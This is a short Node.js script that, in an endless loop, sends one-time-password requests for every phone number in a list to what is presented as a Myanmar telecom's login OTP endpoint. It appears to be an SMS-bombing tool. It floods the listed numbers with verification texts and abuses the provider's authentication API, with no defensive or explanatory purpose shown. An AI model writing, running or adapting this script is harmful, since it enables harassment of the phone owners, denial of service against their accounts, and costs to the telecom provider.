const fetch = require("node-fetch");
const phones = require("./phones.json");

const API_URL = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber="; // replace with real endpoint

async function sendOtp(phone) {
  try {
    const res = await fetch(API_URL + encodeURIComponent(phone), {
      method: "GET"
    });
    const text = await res.text();
    console.log(`[${phone}] => ${res.status} ${text}`);
  } catch (err) {
    console.error(`[${phone}] Error:`, err.message);
  }
}

async function main() {
  while (true) {
    for (const phone of phones) {
      await sendOtp(phone);
      await new Promise(r => setTimeout(r, 1000)); // prevent too fast
    }
  }
}

main();
